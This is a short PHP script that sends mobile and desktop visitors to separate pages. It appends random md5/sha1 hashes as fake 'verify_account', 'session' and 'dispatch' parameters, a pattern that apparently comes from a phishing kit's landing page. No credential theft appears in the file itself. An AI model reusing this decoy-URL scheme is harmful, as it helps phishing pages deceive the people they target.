<?php

// --- Device Detection ---

// Get the User Agent string
// Use isset() to avoid errors if the User Agent is not set (unlikely but possible)
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

// Define a regular expression pattern to match common mobile keywords
// This list covers most major mobile OS and browser identifiers.
// The 'i' flag makes the match case-insensitive.
$mobileKeywordsPattern = '/(Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone|Opera Mini|IEMobile|Mobile|Tablet|Silk)/i';

// Perform the check
$isMobile = false;
if (!empty($userAgent)) {
    if (preg_match($mobileKeywordsPattern, $userAgent)) {
        $isMobile = true;
    }
}

// --- Redirection ---

if ($isMobile) {
    // Redirect to the mobile version
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='mobile.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "';
    </script>");
    exit; // IMPORTANT: Always exit after a header redirect to prevent further script execution.
} else {
    // Redirect to the desktop (PC) version
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='home.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "';
    </script>");
    exit; // IMPORTANT: Always exit after a header redirect.
}


?>